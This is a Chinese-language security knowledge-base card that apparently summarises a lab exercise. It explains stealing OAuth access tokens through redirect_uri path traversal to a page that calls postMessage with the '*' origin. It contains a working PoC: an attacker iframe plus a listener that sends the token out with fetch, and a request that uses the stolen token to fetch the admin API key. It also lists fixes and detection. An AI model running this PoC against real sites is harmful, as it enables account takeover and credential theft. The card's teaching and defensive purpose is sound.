---
id: web-generic-oauth-token-theft-postmessage-proxy-page
title: OAuth access_token 窃取：redirect_uri 穿越到同站评论表单代理页，利用 parent.postMessage(location.href,'*') 泄露 fragment token
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-token-theft-postmessage-proxy-page
tags:
- web
- oauth
- implicit-flow
- postmessage
- token-theft
- redirect-uri
- path-traversal
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V281
  verified_at: '2026-11-08T05:07:38+08:00'
  notes: '已对照原文 Lab: Stealing OAuth access tokens via a proxy page 正文核对：/post/comment/comment-form 存在 parent.postMessage({type:''onload'', data: window.location.href}, ''*'')，redirect_uri 用 /oauth-callback/../post/comment/comment-form 穿越到该代理页，攻击者 iframe + message 监听 fetch 外带 fragment token，再用 token 调 /me 取 apikey。卡内原理/PoC 与原文一致；该 Lab 的图片为 xzfile 远程引用，未落在本地 img/（01-61），依据正文文字核对。与 open-redirect-fragment 卡共享 redirect_uri 穿越前置但利用代理页 postMessage 而非开放重定向，dup-scan pair 裁决为保留两张。未设 affected_versions。未执行靶场。'
url: /docs/web/generic/oauth/web-generic-oauth-token-theft-postmessage-proxy-page/
draft: false
kb_aliases:
- OAuth token postMessage 窃取
- 评论表单 postMessage
- 代理页 OAuth token
- redirect_uri 目录穿越 postMessage
- parent.postMessage location.href
---

## 一句话结论

OAuth 隐式流程的 `redirect_uri` 只校验 `/oauth-callback` 前缀时，可用 `/oauth-callback/../post/comment/comment-form` 穿越到同站的评论表单页；该页会执行 `parent.postMessage({type:'onload', data: window.location.href}, '*')`，把含 `#access_token=...` 的完整 URL 发给任意父窗口，攻击者把自己页面作为父窗口监听 message，即可收到 token 并用它调用 `/me` 取得管理员 API key。

## 原理

- 这是一类"代理页（proxy page）"泄露：站点内某个页面会把 `location.href` 通过 `postMessage` 发给父窗口，且 `targetOrigin` 为 `*`（任何来源的父窗口都能收到）。正常使用时父窗口是同站页面，消息无害；但当该页被攻击者以 iframe 嵌入父窗口时，攻击者的页面就是接收方。
- OAuth 的 `redirect_uri` 若只做前缀匹配，`/oauth-callback/../post/comment/comment-form` 经过服务端/浏览器路径规范化后落在评论表单页，授权响应（隐式流程为 `#access_token=...`）就出现在该页的 URL 中。
- 评论表单页加载后把完整 `window.location.href`（包含 fragment）postMessage 给 `parent`；攻击者页面监听 `message` 事件，`e.data.data` 即带 token 的 URL，再用 `fetch`/图片请求把它外带到自己的服务器。
- 与 XSS 型窃取不同，这里不需要在目标站注入脚本：代理页自身的 `postMessage(..., '*')` 就是泄露通道；`targetOrigin='*'` 让跨源父页面也能接收。fragment 不会随请求发到服务器，但 `location.href` 在 JS 中可读，随后通过攻击者发起的 `fetch` 进入服务器日志。

## 触发条件

- OAuth 服务使用隐式流程（或 fragment 返回 token），`redirect_uri` 只做前缀/路径匹配，且可用 `..` 穿越到其他同站页面。
- 目标站存在会 `postMessage(window.location.href, '*')` 给父窗口的页面（本例为评论表单 `/post/comment/comment-form`），且未校验父窗口来源。
- 管理员会访问攻击者页面，且其 OAuth 会话已登录。
- 攻击者能把 OAuth 授权 URL 嵌入 iframe，并让自己的页面成为父窗口。

## 利用步骤

1. 走一遍自己的 OAuth 登录，抓取 `/auth?client_id=...&redirect_uri=https://target/oauth-callback&response_type=token&nonce=...&scope=...`，确认 token 在 fragment。
2. 确认 `redirect_uri` 可用 `..` 穿越：改为 `https://target/oauth-callback/../post/comment/comment-form`，观察授权响应是否落到评论表单页且 URL 带 `#access_token=...`。
3. 查看评论表单页源码，确认存在 `parent.postMessage({type: 'onload', data: window.location.href}, '*')`。
4. 在攻击者页面放置 iframe（src 为第 2 步的授权 URL），并添加 `message` 监听，把 `e.data.data` 外带。
5. 把攻击者页面发给管理员；管理员浏览器加载后，iframe 完成 OAuth 授权，评论表单页把带 token 的 URL postMessage 给攻击者页面，攻击者服务器记录 token。
6. 用 token 调用 `GET /me`（Authorization: Bearer）取得管理员 API key。

## PoC

攻击者页面：

```html
<iframe src="https://oauth-server/auth?client_id=<CLIENT_ID>&redirect_uri=https://target/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1837481288&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('/' + encodeURIComponent(e.data.data));
}, false);
</script>
```

评论表单页（目标站）的泄露点：

```javascript
parent.postMessage({type: 'onload', data: window.location.href}, '*');
```

攻击者服务器日志（示例）：

```text
GET /https%3A%2F%2Ftarget%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D... HTTP/1.1
```

使用 token：

```http
GET /me HTTP/1.1
Host: target
Authorization: Bearer <stolen_access_token>
```

## 变体与关联

- 变体：任何会 `postMessage(location.href, '*')` 的页面（登录页、iframe 组件、广告/统计页）都可作为代理页；先搜索 `postMessage`/`targetOrigin` 关键字。
- 变体：授权码流程下 code 在 query 中，代理页同样会把含 code 的 URL 发出去；只是 code 需要尽快兑换。
- 变体：若 `targetOrigin` 校验了来源，可寻找同源可控页面、XSS 或 `document.domain` 放松的页面作为父窗口。
- 变体：`redirect_uri` 也可用开放重定向/路径穿越组合，把 token 直接送到攻击者域名（见开放重定向卡）。
- 关联：[[web-generic-oauth-postmessage-code-theft-sso-bind-xxe]]（存储在 XSS + postMessage 窃取 code 的对照卡；本卡无需 XSS）。
- 关联：[[web-generic-oauth-token-theft-open-redirect-fragment]]（开放重定向 + fragment 外带）。
- 关联：[[web-generic-oauth-arbitrary-redirect-uri-code-theft]]（任意 redirect_uri 直接收 code）。

## 检测与防御

- 修复：`postMessage` 必须指定可信的 `targetOrigin`（同源或白名单），不得用 `'*'`；消息体不得包含 `location.href`、token、code 等敏感参数。
- 修复：`redirect_uri` 与注册值精确匹配，匹配前规范化并消除 `..`、编码斜杠等；禁止相对路径。
- 加固：OAuth 使用授权码 + PKCE，避免 token 出现在 URL fragment；CSP `frame-ancestors` 限制页面被第三方嵌入；对敏感页面设置 `X-Frame-Options: DENY`。
- 检测：审计代码中的 `postMessage` 调用，标记 `targetOrigin='*'` 且消息体含 `location.href`/token 的页面；监控 OAuth 回调页被跨源 iframe 嵌入。
- 检测：`redirect_uri` 含 `..` 或指向非注册路径；访问日志出现带 `access_token` 的 URL；同一条 token 被不同 IP 使用。
